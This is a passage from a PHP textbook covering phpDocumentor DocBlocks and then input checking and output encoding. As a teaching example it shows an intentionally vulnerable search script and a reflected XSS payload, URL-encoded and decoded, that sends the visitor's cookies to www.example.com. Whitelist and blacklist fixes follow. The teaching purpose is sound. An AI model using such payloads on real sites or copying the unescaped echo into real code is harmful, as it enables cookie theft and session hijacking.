
```php
$myCar->model = "Beetle";

echo "<p>I'm driving a $myCar->color $myCar->manufacturer $myCar->model.
</p>";

echo "<p>Stepping on the gas...<br />";

while ( $myCar->accelerate() ) {
    echo "Current speed: " . $myCar->getSpeed() . " mph<br />";
}

echo "</p><p>Top speed! Slowing down...<br />";

while ( $myCar->brake() ) {
    echo "Current speed: " . $myCar->getSpeed() . " mph<br />";
}

echo "</p><p>Stopped!</p>";

?>
</body>
</html>
```

Next, install phpDocumentor — if you haven't already done so — by following the instructions earlier in this section. Now open up a command prompt (Windows) or a Terminal window (Mac or Ubuntu), change to your document root folder, and type:

```
phpdoc -o HTML:frames:earthli -f car_simulator_documented.php -t docs
```

If you’re running on Windows you may need to type the full path to phpdoc (for example, c:\wamp\bin\php\php5.2.6\phpdoc).

You should see several lines of output appear, ending in something like:

```
Parsing time: 0 seconds

Conversion time: 1 seconds

Total Documentation Time: 1 seconds
Done
```

Now locate the `index.html` file inside the newly created `docs` folder in your document root. Open this file in your Web browser. You should see a page appear with a list of links down the left-hand side. Try clicking the Car link in the Classes section of the list. You should see a page similar to Figure 20-1.

![](img/1ddec54918a4802eb9b4febec3d4e7f6_676_0.png)

Figure 20-1

## How It Works

Apart from the added comments, this script is identical to the car_simulator.php script in Chapter 8. The first DocBlock describes the contents of the script file:

```
/**
 * Car simulation example
 *
 * This script demonstrates how to use OOP to create a simple
 * simulation of a car.
 *
 * @author Matt Doyle
 * @version 1.0
 * @package CarSimulator
 */
```

The first line of the DocBlock is the short description. This is normally used as a heading in the final documentation. After the short description comes a blank line (beginning with an asterisk) and then the long description. Following the long description, three tags give more information about the script file, including the author, the version, and the name of the package that the script belongs to.

The second DocBlock describes the `Car` class itself:

```
/**
 * Represents a real-world automobile
 *
 * This class represents an automobile. The automobile can have
 * a specified color, manufacturer, and model. Methods are provided
 * to accelerate and slow down the car, as well as retrieve the
 * car's current speed.
 *
 * @package CarSimulator
 */
```

As with the previous DocBlock, this DocBlock contains a short description, a long description, and a `@package` tag to specify the package that the class belongs to.

Within the class, a separate DocBlock describes each property and method. For example, the private `$_speed` property is documented as follows:

```
/**
 * @var string The current speed of the car
 * @access private
 */
private $_speed = 0;
```

The `@var` tag lets you specify the data type of the variable. Because PHP is loosely typed, this is a useful way to remind yourself (and other developers) of each variable's intended type.

Also notice that the `$_speed` property's DocBlock has an `@access private` tag. This tells phpDocumentor that the property is private, and shouldn't be included in the standard documentation.

> You can use the --parseprivate option to make phpDocumentor document private code too. This is useful if you need to produce documentation for developers who are modifying your classes, rather than just working with them.

Here is the `getSpeed()` method's DocBlock:

```
/**
 * Returns the car's speed
 *
 * Returns the current speed of the vehicle, in miles per hour
 *
 * @return int The car's speed in mph
 */
public function getSpeed() {
    return $this->_speed;
}
```

This DocBlock contains a short description, a long description, and a `@return` tag. This tag describes the return value from the method, and specifies its data type.

Try browsing the documentation pages you generated earlier to see how each of these DocBlocks affects phpDocumentor's output.

## Checking Input and Encoding Output

Many of the chapters throughout this book have emphasized the importance of security when writing PHP applications. Attacks on Web applications are very common, and if you write a popular application containing security holes, it is only a matter of time before those holes are exploited. Attackers can then use your application to do various nasty things, including (but not limited to):

- Gaining access to usernames, passwords, sessions, and cookies
- Modifying or deleting data in your database
- Altering your Web site content (such as defacing your home page)
- Running external applications or manipulating files (such as /etc/passwd) on your Web server
- Taking over the entire Web server that hosts your application

Therefore it makes sense to eliminate or prevent security holes in your applications. The vast majority of holes in Web applications are caused by one (or both) of the following:

- Not properly checking data fed into the application
- Not properly encoding data in the application’s output (typically the displayed Web page)

Here’s a simple example of an insecure PHP script called search.php:

```
<?php
$searchQuery = $_GET['search'];
echo "You searched for: $searchQuery";
// (display search results here)
?>
```

This search engine script reads the user-supplied search text from the search parameter, then redisplays the search text in the page (followed by the search results). For example, if the script was called with the URL

```
http://localhost/search.php?search=monkeys
```

the script would display the following:

```
You searched for: monkeys
```

So far so good. However, what if the following URL is passed to the script?

```
http://localhost/search.php?search=%3Cscript%3Edocument.location.href%3D%27http%3A%2F%2Fwww.example.com%3Fstolencodeokies%3D%27%2Bdocument.cookie%3C/script%3E
```

This URL might be in an email message sent to the visitor from an attacker. If the visitor clicks the link, the script will output the following markup to the browser:

```
You searched for: <script>document.location.href='http://www.example
.com?stolencodeokies=' + document.cookie</script>
```

In this example, the query string in the link contains some malicious JavaScript code (encoded using URL encoding). The search engine script dutifully includes the contents of the query string — that is, the malicious JavaScript — in the resulting Web page markup. Assuming the visitor’s browser has JavaScript enabled, this will cause the browser to redirect to a server-side script on www.example.com, passing all of the visitor’s cookies associated with the original site to the script. The owner of www.example.com will then have access to all the same visitor cookies as the original site. This might allow them to impersonate the visitor or hijack the visitor’s login session, for example. Such an attack is often called a cross-site scripting (XSS) attack.

Clearly this security hole is caused by the fact that the user input (the query string) is sent straight to the browser without checking or encoding the supplied data.

*Other common types of attacks to watch out for include SQL injection (covered in Chapter 13) and CSRF (cross-site request forgery) attacks. Find out more on CSRF attacks at http://en.wikipedia.org/wiki/Cross-site_request_forgery.*

### Checking Input

Your scripts should check all external input before using it. This includes data in query strings, cookies, and form submissions; data retrieved from reading other Web pages; data stored in files and database tables, and so on.

For example, the previously shown security hole could be plugged by checking the contents of the query string supplied by the user:

```php
<?php

$searchQuery = $_GET['search'];

if ( !preg_match( "/^[a-zA-Z0-9]*$/", $searchQuery ) ) {
    echo "Invalid input: please use only letters and digits";
    exit;
}

echo "You searched for: " . $searchQuery;
// (display search results here)

?>
```

Here, a regular expression is used to terminate the script if the query string contains anything other than letters and digits. (In a real-world application you would probably redisplay the search form, prompting the user to try again.)

This technique is known as *whitelisting* because you only accept characters that match a whitelist (in this case, letters and digits). Alternatively, you can use *blacklisting*, where you reject characters that are on a blacklist:

```php
if ( preg_match( "/[<>&#]/", $searchQuery ) ) {
    echo "Invalid input: please don't use <lt; &gt;, &amp; or &";
    exit;
}
```
